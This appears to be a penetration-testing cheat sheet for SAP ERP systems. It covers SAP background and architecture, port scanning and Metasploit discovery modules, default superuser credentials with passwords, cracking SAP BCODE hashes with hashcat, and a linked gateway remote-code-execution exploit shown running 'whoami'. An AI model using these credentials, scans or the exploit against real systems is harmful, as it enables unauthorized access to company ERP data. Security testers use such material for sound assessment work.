### 1 - Introduction:

SAP stands for **Systems, Applications, and Products in Data Processing** and distributes ERP (Enterprise Resource Planning) software which allows to manage the activity of large and small companies. ERP stands for Enterprise Resource Planning and is a business process management system that automates and integrates all of an organization's core business processes into a shared database to streamline processes and information across the organization.

#### SAP Provides 5 ERP: 

- **SAP ERP (SAP)**: This is the classic suite that can be deployed on site, on a public IaaS or in a private cloud. SAP also offers companies to migrate SAP ERP to a PaaS by converting it to S/4HANA.
- **S/4HANA**: S/4HANA is the **new generation** of ERP from SAP. Used primarily by medium and large companies with annual revenues of at least $250 million.
- **S/4HANA Cloud**: This is the SaaS version of S/4HANA.
- **SAP Business One**: SAP Business One is SAP's ERP suite for **small and medium-sized enterprises** (SME). This suite is designed for companies with up to 350 employees.
- **SAP Business ByDesign**: this is the SaaS version of SAP and allows to do financial management, including CRM, HRIS/HCM and more...


#### Systems covered by SAP include:

- Enterprise Resource Planning (ERP) - supports the basic internal business processes of a company
- Customer Relationship Management (CRM) – helps companies acquire and retain customers, gain marketing and customer insight
- Product Lifecycle Management (PLM) – helps manufacturers with product-related information
- Supply Chain Management (SCM) – helps companies with the process of resourcing its manufacturing and service processes
- Supplier Relationship Management (SRM) – enables companies to procure from suppliers


#### SAP Specific terms:

##### What is a CLIENT ?

The SAP client concept allows an organization to split a system into logical subunits and they contains independent information and data. The number of clients in a SAP system directly influences the following:

- **Buffer**: The number of clients impacts buffering demand. An example is main memory usage.
- **Upgrade**: Different activities are affected by SAP upgrades, where run timers are longer, depending on the number of clients.

*SAP Client Roles:*
- **Client CUST**: Used for making developments and serving other customer-specific requirements. The SAP transport management system is used to move CUST client changes to other clients.
- **Client QST**: Defined for testing and verifying various applied changes.
- **Client PRD**: Used for production and business activities.

*Known Clients:*
- **000** : this client is called as golden client which is provided by SAP as refrence client.
- **001** : this client is called as configuration client which have all the SAP standard customizing client.
- **066** : is the earlywatch client for SAP use.

Architecture based on SAP:

![image](https://user-images.githubusercontent.com/75935486/153075669-6a7c6b54-b522-44c2-8605-f4761f84ebe5.png)

 The **Internet Communication Manager** (ICM) sets up the connection to the Internet and process both server and client Web requests and the Central services (message server and enqueue server) is used for lock administration, message exchange and load balancing in the SAP system.
 
 **AS ABAP components:**
 - The dispatcher: distributes the requests to the work processes.
 - The work processes: executes ABAP or Java programs.
 - The SAP Gateway: provides the RFC interface between the SAP instances.
 
 **AS Java components:**
 - The Server Processes: execute Java requests.
 - The instance controller: controls and monitors the life cycle of the AS Java instance.

### 2 - Discovery:

Port Scanning
```python
nmap -sCV -T3 --min-rate=3000 -p 1128,3201,3299,3301,3901,4901,4902,4903,8101,30101,30102,30103,30104,30107,30108,30111,30116,40000,40001,40002,40080,46287,50000,50001,50004,50007,50013,50014,50020,50113,50114 127.0.0.1
```

useful metasploit scanners:
- `msf > use auxiliary/scanner/sap/sap_service_discovery`
- `msf > use auxiliary/scanner/sap/sap_router_info_request`
- `msf > use auxiliary/scanner/sap/sap_router_portscanner`

![image](https://user-images.githubusercontent.com/75935486/153284008-14b61bbc-a3c1-41e3-924b-f9af8ef79606.png)


#### Proxying SAPRouter:
```bash
set proxies sapni:<network-ip>:3299
```

### 3 - Password Stealing & Hash Cracking:

###### Default Credentials:

User ID | Description | Clients | Password |
--- | --- | --- | --- |
SAP* | Super user | 000,001, 066 new clients | 06071992, PASS
DDIC | ABAP Dictionary super user | 000,001 | 19920706 
EarlyWatch | User for the EarlyWatch Service | 066 | SUPPORT
SAPCPIC | Communication User | 000,001 | ADMIN 

###### Cracking hashes:

![image](https://user-images.githubusercontent.com/75935486/153094382-443663fc-52d1-4ad8-ab4b-48723ce661f6.png)

*example*: Cracking ***SAP CODVN B (BCODE)** hash `TESTUSER1$D1FD06BD3B0744D9` using hashcat:
```bash
hashcat -m 7700 hash -a 0 /usr/share/wordlists/rockyou.txt  --force
```
![image](https://user-images.githubusercontent.com/75935486/153094640-3f9a9408-3e1e-41ff-9cbe-03923d898818.png)


### 4 - Code Execution:

> https://github.com/chipik/SAP_GW_RCE_exploit

```bash
➜python SAPanonGWv1.py -t 172.16.30.28 -p 3300 -c whoami
[*] sending cmd:whoami
RistBS
```
